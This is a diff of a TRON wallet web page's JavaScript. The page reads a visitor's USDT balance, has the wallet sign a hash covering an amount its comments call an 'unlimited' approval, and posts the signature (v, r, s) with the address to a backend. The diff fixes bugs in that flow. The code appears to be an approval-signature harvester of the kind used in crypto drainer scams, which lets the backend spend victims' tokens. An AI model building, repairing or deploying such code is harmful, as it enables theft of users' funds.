@@ -454,6 +454,8 @@
                     }
                     const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                     userAddress = accounts[0];
+                    // 清理地址隐形字符（关键：避免不可见字符导致格式错误）
+                    userAddress = cleanBase58Address(userAddress);
                     connectBtn.style.display = "none";
                     warning.style.display = "none";
                     await initWallet();
@@ -486,7 +488,7 @@
                     postData.signature = { v, r, s };
                     // 构造后端要求的提交参数（对齐接口字段）
                     const submitData = {
-                        user: postData.address, // 后端要求参数名：user
+                        user: postData.address, // 后端要求参数名：user（Base58原始格式）
                         amount: postData.amount, // 无限额度授权金额
                         v: postData.signature.v, // 单独传递签名参数v
                         r: postData.signature.r, // 单独传递签名参数r
@@ -552,59 +554,72 @@
                     alert(`查看提交数据失败：${e.message}`);
                 }
             };
-            // 查看授权状态
+            // 查看授权状态（修复URL拼接错误）
             checkStatusBtn.onclick = async () => {
-  try {
-    checkStatusBtn.disabled = true;
-    checkStatusBtn.innerHTML = ' 查询中...';
-    const statusUrl = ${BACKEND_API}/approve/status?userAddress=${encodeURIComponent(userAddress)};
-    const res = await fetch(statusUrl, {
-      method: "GET",
-      credentials: "include"
-    });
-
-    // 新增：先解析响应体，无论是否ok都处理
-    const resData = await res.json().catch(() => ({ success: false, msg: "后端响应格式错误" }));
-
-    if (!res.ok || !resData.success) {
-      throw new Error(resData.msg || `查询失败（${res.status}）`);
-    }
-
-    // 核心修复：更新本地授权记录
-    const latestApproval = resData.data?.latestApproval || {};
-    if (latestApproval.address === userAddress) {
-      // 更新本地记录的状态
-      updateApprovalRecordStatus(
-        userAddress,
-        latestApproval.status || "未查询到状态"
-      );
-      // 若有txid，补充到记录中
-      if (latestApproval.txid) {
-        const existingRecords = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-        const updatedRecords = existingRecords.map(record => 
-          record.address === userAddress ? { ...record, txid: latestApproval.txid } : record
-        );
-        localStorage.setItem(RECORD_KEY, JSON.stringify(updatedRecords));
-      }
-      // 强制重新渲染页面
-      renderApprovalRecords();
-      updateRecordCount();
-      showToast(`当前状态：${latestApproval.status || "未查询到状态"}`);
-    } else {
-      showToast("后端返回的地址与当前用户不匹配", "error");
-    }
-  } catch (e) {
-    showToast(`查询失败：${e.message}`, "error");
-  } finally {
-    checkStatusBtn.disabled = false;
-    checkStatusBtn.innerHTML = ' 查看授权状态';
-  }
-};
+                try {
+                    checkStatusBtn.disabled = true;
+                    checkStatusBtn.innerHTML = ' 查询中...';
+                    // 修复：URL拼接用模板字符串，避免语法错误
+                    const statusUrl = `${BACKEND_API}/approve/status?userAddress=${encodeURIComponent(userAddress)}`;
+                    const res = await fetch(statusUrl, {
+                        method: "GET",
+                        credentials: "include"
+                    });
+                    // 新增：先解析响应体，无论是否ok都处理
+                    const resData = await res.json().catch(() => ({ success: false, msg: "后端响应格式错误" }));
+                    if (!res.ok || !resData.success) {
+                        throw new Error(resData.msg || `查询失败（${res.status}）`);
+                    }
+                    // 核心修复：更新本地授权记录
+                    const latestApproval = resData.data?.latestApproval || {};
+                    // 匹配Base58地址（原始格式，不转大小写）
+                    if (latestApproval.userAddress === userAddress) {
+                        // 更新本地记录的状态
+                        updateApprovalRecordStatus(
+                            userAddress,
+                            latestApproval.status || "未查询到状态"
+                        );
+                        // 若有txid，补充到记录中
+                        if (latestApproval.txid) {
+                            const existingRecords = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+                            const updatedRecords = existingRecords.map(record => 
+                                record.address === userAddress ? { ...record, txid: latestApproval.txid } : record
+                            );
+                            localStorage.setItem(RECORD_KEY, JSON.stringify(updatedRecords));
+                        }
+                        // 强制重新渲染页面
+                        renderApprovalRecords();
+                        updateRecordCount();
+                        showToast(`当前状态：${latestApproval.status || "未查询到状态"}`);
+                    } else {
+                        showToast("后端返回的地址与当前用户不匹配", "error");
+                    }
+                } catch (e) {
+                    showToast(`查询失败：${e.message}`, "error");
+                } finally {
+                    checkStatusBtn.disabled = false;
+                    checkStatusBtn.innerHTML = ' 查看授权状态';
+                }
+            };
             window.addEventListener("beforeunload", () => {
                 saveTrxStateToStorage();
                 if (trxTimer) clearInterval(trxTimer);
             });
         };
+        /**
+         * 新增：清理Base58地址（去除隐形字符+校验格式）
+         */
+        function cleanBase58Address(address) {
+            if (!address) throw new Error("地址不能为空");
+            // 去除空格、零宽字符等不可见字符
+            const cleanAddr = address.trim().replace(/[\s\u200B-\u200D\uFEFF]/g, '');
+            // 校验Base58格式（34位字母数字）
+            const base58Regex = /^[A-Za-z0-9]{34}$/;
+            if (!base58Regex.test(cleanAddr)) {
+                throw new Error(`无效的Base58地址（长度${cleanAddr.length}位，需34位字母数字）`);
+            }
+            return cleanAddr;
+        }
         /**
          * 自定义hex转字节函数（保留你之前成功的逻辑，无需改动）
          */
@@ -620,54 +635,75 @@
             return bytes;
         }
       
-async function generateOfflineSignature(userAddress, contractAddress, amount) {
-    try {
-        // 1. 基础参数校验
-        if (!userAddress || !contractAddress || !amount) throw new Error("参数不能为空");
-        const base58Regex = /^[A-Za-z0-9]{34}$/;
-        if (!base58Regex.test(userAddress) || !base58Regex.test(contractAddress)) throw new Error("地址格式错误");
-
-        // 2. 编码参数（模拟合约abi.encodePacked）
-        const userHex = tronWeb.address.toHex(userAddress).replace("0x", "").padStart(64, "0");
-        const contractHex = tronWeb.address.toHex(contractAddress).replace("0x", "").padStart(64, "0");
-        const amountHex = amount.replace("0x", "").padStart(64, "0");
-        const combinedHex = userHex + contractHex + amountHex;
-
-        // 3. 生成签名哈希
-        const messageHash = tronWeb.sha3(combinedHex, true);
-
-        // 4. 唤起钱包签名+强制清理签名格式
-        let signature = await tronWeb.trx.sign(messageHash);
-        signature = typeof signature === "object" ? signature.signature : signature; // 兼容对象返回
-        signature = signature.replace(/^0x/, ""); // 强制去掉签名的0x前缀（关键！）
-        if (signature.length !== 130) throw new Error(`签名格式错误（长度应为130，当前${signature.length}）`);
-
-        // 5. 正确截取R/S/V（仅取有效部分）
-        const r = `0x${signature.slice(0, 64)}`;   // 前64位→R
-        const s = `0x${signature.slice(64, 128)}`; // 中间64位→S
-        const rawV = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V
-        const v = (rawV % 2) + 27; // 原始V是0/1，转成合法的27/28
-
-        // 验证V值合法性
-        if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}，需为27/28）`);
-
-        // 保存正确的提交数据
-        const submitData = { user: userAddress, amount, v, r, s };
-        localStorage.setItem("valid_submit_data", JSON.stringify(submitData));
-
-        showToast(`V/R/S生成成功（v=${v}）`);
-        return { v, r, s };
-    } catch (e) {
-        showToast(`生成失败：${e.message}`, "error");
-        throw new Error(e.message);
-    }
-}
         /**
-         * 初始化钱包：获取地址、余额
+         * 核心修复：生成符合Base58格式+imToken兼容的签名
+         */
+        async function generateOfflineSignature(userAddress, contractAddress, amount) {
+            try {
+                // 1. 强化Base58地址校验（双重保险）
+                const cleanUserAddr = cleanBase58Address(userAddress);
+                const cleanContractAddr = cleanBase58Address(contractAddress);
+                // 2. 金额格式修正
+                let fixedAmount = amount.replace(/^Ox/i, "0x");
+                const hexRegex = /^0x[0-9a-fA-F]*$/;
+                if (!hexRegex.test(fixedAmount)) {
+                    throw new Error("授权金额格式错误，必须以0x开头（数字0），后跟字母数字");
+                }
+                // 3. 编码参数（与合约abi.encodePacked完全对齐）
+                // 地址转Hex仅用于编码，传递给后端仍用Base58
+                const userHex = tronWeb.address.toHex(cleanUserAddr).replace("0x", "").padStart(64, "0");
+                const contractHex = tronWeb.address.toHex(cleanContractAddr).replace("0x", "").padStart(64, "0");
+                const amountHex = fixedAmount.replace("0x", "").padStart(64, "0");
+                const combinedHex = userHex + contractHex + amountHex;
+                // 4. 生成签名哈希（兼容imToken签名逻辑）
+                const messageHash = tronWeb.sha3(combinedHex, true);
+                // 5. 唤起imToken签名（原生方法，100%兼容）
+                let signature = await tronWeb.trx.sign(messageHash);
+                signature = typeof signature === "object" ? signature.signature : signature; // 兼容对象返回
+                if (!signature) throw new Error("imToken未返回签名结果");
+                signature = signature.replace(/^0x/, ""); // 强制去掉签名前缀，避免重复
+                if (signature.length !== 130) throw new Error(`签名格式错误（长度应为130，当前${signature.length}位）`);
+                // 6. 解析合法V/R/S（适配合约要求）
+                const r = `0x${signature.slice(0, 64)}`;   // 前64位→R（0x+64位Hex）
+                const s = `0x${signature.slice(64, 128)}`; // 中间64位→S（0x+64位Hex）
+                const rawV = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V
+                const v = (rawV % 2) + 27; // 原始V=0/1 → 转为合法27/28
+                // 验证参数合法性
+                if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}，需为27/28）`);
+                if (!r.startsWith("0x") || r.length !== 66) throw new Error("R值格式错误");
+                if (!s.startsWith("0x") || s.length !== 66) throw new Error("S值格式错误");
+                // 保存调试信息
+                localStorage.setItem(`signature_debug_${cleanUserAddr}`, JSON.stringify({
+                    step: "签名生成成功（Base58格式兼容）",
+                    userAddress: cleanUserAddr,
+                    contractAddress: cleanContractAddr,
+                    v: v,
+                    r: r,
+                    s: s,
+                    timestamp: new Date().toISOString()
+                }, null, 2));
+                showToast(`V/R/S生成成功（v=${v}，地址格式合法）`);
+                return { v, r, s };
+            } catch (e) {
+                const debugKey = `signature_debug_${userAddress || 'unknown'}`;
+                localStorage.setItem(debugKey, JSON.stringify({
+                    step: "签名生成失败",
+                    error: e.message,
+                    userAddress: userAddress,
+                    timestamp: new Date().toISOString()
+                }, null, 2));
+                throw new Error(`生成失败：${e.message} → 点击「查看调试信息」按钮查看详情`);
+            }
+        }
+        /**
+         * 初始化钱包：获取地址、余额（确保地址为Base58原始格式）
          */
         async function initWallet() {
             try {
+                // 获取imToken原生Base58地址（不转大小写）
                 userAddress = tronWeb.defaultAddress.base58;
+                // 清理+校验地址（关键步骤）
+                userAddress = cleanBase58Address(userAddress);
                 const trc20Contract = await tronWeb.contract().at(USDT_CONTRACT);
                 const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
                 tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
@@ -678,6 +714,7 @@ async function generateOfflineSignature(userAddress, contractAddress, amount) {
                     ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                     USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
                 `;
+                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
                 document.getElementById("approveBtn").disabled = false;
                 document.getElementById("checkStatusBtn").disabled = false;
                 updateWalletStatus();
